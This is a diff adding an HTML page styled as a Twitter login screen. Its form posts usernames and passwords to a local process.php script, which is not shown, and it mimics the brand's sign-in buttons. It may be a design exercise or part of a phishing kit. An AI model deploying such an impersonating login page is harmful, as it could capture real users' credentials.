@@ -1,0 +1,165 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Twitter login</title>
+    <style>
+        /* CSS styles here */
+        @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
+
+.logo {
+width: 100px; /* تعيين العرض الجديد للشعار */
+height: auto; /* السماح بتغيير الارتفاع تلقائيًا بناءً على العرض المحدد */
+}
+
+
+
+*{
+margin: 0;
+padding: 0;
+box-sizing: border-box;
+font-family: 'Poppins', sans-serif;
+}
+
+body{
+display: flex;
+justify-content: center;
+}
+
+.container{
+display: flex;
+flex-direction: column;
+justify-content: center;
+align-items: center;
+margin: 3rem 0;
+padding: 1%;
+border-radius: 12px;
+background: #000000;
+box-shadow:  14px 14px 30px #1f1f1f,
+     -14px -14px 24px #fffefe;
+}
+
+.button{
+display: flex;
+align-items:center;
+border: 1px gray solid;
+border-radius: 24px;
+background-color: white;
+padding: .5rem 4rem;
+margin: 1rem 0;
+}
+
+.button:hover{
+background-color: #f5f5f5;
+cursor: pointer;
+}
+
+.button .img{
+padding-right: 1rem;
+}
+
+.button p{
+font-weight: bolder;
+}
+
+.img{
+max-width: 40px;
+max-height: 40px;
+}
+
+.form{
+margin: 1rem 0;
+display: flex;
+flex-direction: column;
+}
+
+input{
+margin: .8rem;
+}
+
+input[type="text"]{
+border: 1px gray solid;
+border-radius: 4px;
+padding: .4rem 1rem;
+}
+
+input[type="text"]:focus{
+outline: none;
+border: 1px solid #1d9bf0;
+cursor: pointer;
+}
+input[type="password"]{
+border: 1px gray solid;
+border-radius: 4px;
+padding: .4rem 1rem;
+}
+
+input[type="password"]:focus{
+outline: none;
+border: 1px solid #1d9bf0;
+cursor: pointer;
+}
+
+#next{
+background-color: rgb(252, 252, 252);
+color: rgb(0, 0, 0);
+border: 1px black solid;
+border-radius: 24px;
+padding: .5rem 4rem;
+font-weight: bold;
+}
+
+#next:hover{
+cursor: pointer;
+}
+
+#forgot{
+background-color: white;
+border: 1px gray solid;
+border-radius: 24px;
+padding: .5rem 4rem;
+}
+
+#forgot:hover{
+background-color: #f5f5f5;
+cursor: pointer;
+}
+
+#signup{
+color: gray;
+font-size: 14px;
+}
+
+#signup a{
+color: #1d9bf0;
+text-decoration: none;
+}
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="logo.png" alt="twitter logo" class="logo">
+        <button class="button">
+            <img src="https://img.icons8.com/color/48/undefined/google-logo.png" alt="google logo" class="img">
+            <p>Sign in with Google</p>
+        </button>
+        <button class="button">
+            <img src="https://img.icons8.com/ios-filled/50/undefined/mac-os.png" alt="apple logo" class="img">
+            <p>Sign in with Apple</p>
+        </button>
+        <p>or</p>
+        <form class="form" action="process.php" method="POST">
+            <input type="text" placeholder="Phone, email or username" name="username" required>
+            <input type="password" placeholder="Password" name="password" required>
+            <input id="next" type="submit" value="Next">
+            <input id="forgot" type="submit" value="Forgot Password ?">
+        </form>
+        <p id="signup">Don't have an account ? <a href="#">Sign up</a></p>
+    </div>
+</body>
+</html>
